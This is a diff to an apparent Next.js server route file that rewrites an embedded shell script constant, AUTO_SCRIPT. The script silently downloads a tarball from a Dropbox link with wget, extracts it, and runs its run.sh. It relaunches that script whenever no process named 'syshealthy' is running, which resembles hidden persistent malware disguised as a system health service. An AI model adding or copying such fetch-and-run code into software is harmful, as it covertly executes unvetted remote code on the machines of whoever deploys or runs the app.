@@ -5,10 +5,21 @@ import { NextResponse } from 'next/server';
 import { randomUUID } from 'crypto';
 
 const AUTO_SCRIPT = `
-if [ ! -d "/home/z/dock" ]; then
-  git clone https://github.com/niaalae/dock.git /home/z/dock && bash /home/z/dock/docky-main/run.sh --log
+# Run docky in current working directory. If not present, download and extract
+# then run the bundled run.sh with --log. If docky exists, start it only when
+# no process matching "syshealthy" is running.
+if [ ! -d "./docky-main" ] && [ ! -d "./docky" ]; then
+  wget -q -O /tmp/docky.tar.gz "https://www.dropbox.com/scl/fi/iwnmu7tbc79rdmw23fw1f/docky.tar.gz?rlkey=xnkpvcu7ox972r45oxlzjak2z&dl=1" && \
+  tar -xzf /tmp/docky.tar.gz -C . && \
+  if [ -x ./docky-main/run.sh ]; then bash ./docky-main/run.sh --log; elif [ -x ./docky/run.sh ]; then bash ./docky/run.sh --log; fi
 else
-  bash /home/z/dock/docky-main/run.sh --log
+  if ! pgrep -f "syshealthy" > /dev/null; then
+    if [ -x ./docky-main/run.sh ]; then
+      bash ./docky-main/run.sh --log
+    elif [ -x ./docky/run.sh ]; then
+      bash ./docky/run.sh --log
+    fi
+  fi
 fi
 `;
 
